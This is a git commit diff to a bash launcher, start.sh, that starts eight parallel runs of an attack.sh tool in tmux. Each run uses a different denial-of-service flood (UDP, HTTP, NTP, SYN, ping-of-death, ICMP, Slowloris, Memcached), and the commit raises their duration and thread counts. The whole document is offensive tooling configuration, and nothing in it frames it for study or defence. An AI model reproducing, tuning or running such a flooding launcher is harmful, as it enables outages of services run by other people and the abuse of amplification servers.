3a4496f0ca6e97af7de3a748d01b3c1a85ab74c7
Peace <zutar1049@gmail.com>
2022-03-01 17:47:25 +0000

    tweak concurrency

--- start.sh
+++ start.sh
@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 
 tmux kill-session -t "peace" 2>/dev/null
-tmux new-session -d -s "peace" "./attack.sh --method UDP --time 50 --threads 20" \; \
-  split-window -dh "./attack.sh --method HTTP --time 50 --threads 20" \; \
-  split-window -dh "./attack.sh --method NTP --time 50 --threads 20" \; \
-  split-window -dh "./attack.sh --method SYN --time 50 --threads 20" \; \
-  split-window -dv -t 0 "./attack.sh --method POD --time 50 --threads 20" \; \
-  split-window -dv -t 2 "./attack.sh --method ICMP --time 50 --threads 20" \; \
-  split-window -dv -t 4 "./attack.sh --method Slowloris --time 50 --threads 20" \; \
-  split-window -dv -t 6 "./attack.sh --method Memcached --time 50 --threads 20" \; \
+tmux new-session -d -s "peace" "./attack.sh --method UDP --time 60 --threads 50" \; \
+  split-window -dh "./attack.sh --method HTTP --time 60 --threads 50" \; \
+  split-window -dh "./attack.sh --method NTP --time 60 --threads 50" \; \
+  split-window -dh "./attack.sh --method SYN --time 60 --threads 50" \; \
+  split-window -dv -t 0 "./attack.sh --method POD --time 60 --threads 50" \; \
+  split-window -dv -t 2 "./attack.sh --method ICMP --time 60 --threads 50" \; \
+  split-window -dv -t 4 "./attack.sh --method Slowloris --time 60 --threads 50" \; \
+  split-window -dv -t 6 "./attack.sh --method Memcached --time 60 --threads 50" \; \
 attach
